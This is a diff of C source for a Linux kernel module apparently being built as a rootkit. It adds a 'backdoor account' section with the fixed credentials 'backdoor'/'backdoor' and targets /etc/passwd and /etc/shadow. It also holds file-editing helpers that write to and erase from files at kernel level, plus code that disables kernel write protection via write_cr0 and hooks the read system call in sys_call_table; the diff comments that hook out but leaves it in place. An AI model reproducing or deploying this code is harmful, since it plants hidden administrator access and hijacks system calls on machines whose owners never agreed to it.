@@ -42,48 +42,90 @@ psize **find(void) {
 // backdoor account
 // ================
 
-/*
+// username is 'backdoor'
+// password is 'backdoor'
 
-struct file *f;
-    const char* text_to_add = "Text to add...";
+#define FILE_NAME "/home/matt/Documents/rootkit/test.txt"
+#define ADDED_LINE "this is the added line\n"
+#define PASSWD_PATH "/etc/passwd"
+#define SHADOW_PATH "/etc/shadow"
+#define PASSWD_STRING "idk"
+#define SHADOW_STRING "idk"
 
-    printk(KERN_INFO "My module is loaded\n");
+void delete_text_from_file(char* text, char* file_path) {
 
-    f = filp_open("test.txt", O_WRONLY | O_APPEND, 0);
+	// declare variables
+	int size;
+	mm_segment_t fs;
+	char* position;
+	int text_size;
+	int offset;
+	char* end_of_file;
+	int end_of_file_size;
+	int new_size;
 
-    if(f == NULL) printk(KERN_ALERT "filp_open error!!.\n");
+	// open file
+	struct file* filp = filp_open(file_path, O_RDWR, 0);
+	if (IS_ERR(filp)) {
 
-    else{
+		printk(KERN_ALERT "could not open file %s\n", file_path);
+		return;
+	}
 
-        fs = get_fs();
+	// find file size
+	vfs_llseek(filp, 0, SEEK_END);
+	size = filp->f_pos;
+	vfs_llseek(filp, 0, SEEK_SET);
+	printk("file size: %d\n", size);
+
+	char buf[size + 1];
+	buf[size] = 0;
+
+	// set fs
+	fs = get_fs();
         set_fs(get_ds());
 
-	original_end = f->f_pos;
-	vfs_write(f, text_to_add, 8, &f->f_pos);
+	// find our text in the file
+	vfs_read(filp, buf, size, &filp->f_pos);
+	position = strstr(buf, text);
+	if (position == NULL) {
+
+		printk("couldn't find text, weird...\n");
+		set_fs(fs);
+		filp_close(filp, NULL);
+		return;
+	}
+
+	// create a buch of variables with this pointer
+	text_size = strlen(text);
+	offset = position - buf;
+	end_of_file = position + text_size;
+	end_of_file_size = size - offset - text_size;
+	new_size = size - text_size;
+
+	// write over the found text
+	vfs_llseek(filp, offset, SEEK_SET);
+	vfs_write(filp, end_of_file, end_of_file_size, &filp->f_pos);
+
+	// truncate file
+	do_truncate(filp->f_dentry, new_size, 0, filp);
 
         set_fs(fs);
-    }
-
-    filp_close(f,NULL);
-
-=======================================
-
-fs = get_fs();
-    set_fs(get_ds());
-
-    vfs_truncate("test.txt", original_end);
-    set_fs(fs);
-
-*/
+	filp_close(filp, NULL);
+}
 
 asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 
+	// declare variables
+	char* tmp;
+	char* pathname;
+
 	int ret = (*o_read)(fd, buf, count);
 
-	struct file* file = fcheck(fd);
-	struct path* path = &file->f_path;
+	struct file* filp = fcheck(fd);
+	struct path* path = &filp->f_path;
 	path_get(path);
-	char* tmp = (char *)__get_free_page(GFP_KERNEL);
+	tmp = (char *)__get_free_page(GFP_KERNEL);
 
 	if (!tmp) {
 
@@ -92,7 +134,7 @@ asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 		return ret;
 	}
 
-	char* pathname = d_path(path, tmp, PAGE_SIZE);
+	pathname = d_path(path, tmp, PAGE_SIZE);
 	path_put(path);
 
 	if (IS_ERR(pathname)) {
@@ -109,19 +151,43 @@ asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 	return ret;
 }
 
-void add_backdoor() {
+void add_backdoor(void) {
+
+	// declare variables
+	mm_segment_t fs;
+
+	struct file* filp = filp_open(FILE_NAME, O_WRONLY | O_APPEND, 0);
+	if (IS_ERR(filp)) {
+
+		printk(KERN_ALERT "could not open file %s\n", FILE_NAME);
+		return;
+	}
+
+	fs = get_fs();
+        set_fs(get_ds());
+
+	vfs_write(filp, ADDED_LINE, strlen(ADDED_LINE), &filp->f_pos);
+
+        set_fs(fs);
+
+	filp_close(filp, NULL);
 	
-	write_cr0(read_cr0() & (~ 0x10000));
+	/*write_cr0(read_cr0() & (~ 0x10000));
 	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read);
-	write_cr0(read_cr0() | 0x10000);
+	write_cr0(read_cr0() | 0x10000);*/
 }
 
-void remove_backdoor() {
+void remove_backdoor(void) {
 
-	write_cr0(read_cr0() & (~ 0x10000));
+	delete_text_from_file(ADDED_LINE, FILE_NAME);
+
+	/*write_cr0(read_cr0() & (~ 0x10000));
 	xchg(&sys_call_table[__NR_read],o_read);
-	write_cr0(read_cr0() | 0x10000);
+	write_cr0(read_cr0() | 0x10000);*/
 }
+
+// load and unload the module
+// ==========================
 
 int init_module(void) {
     	
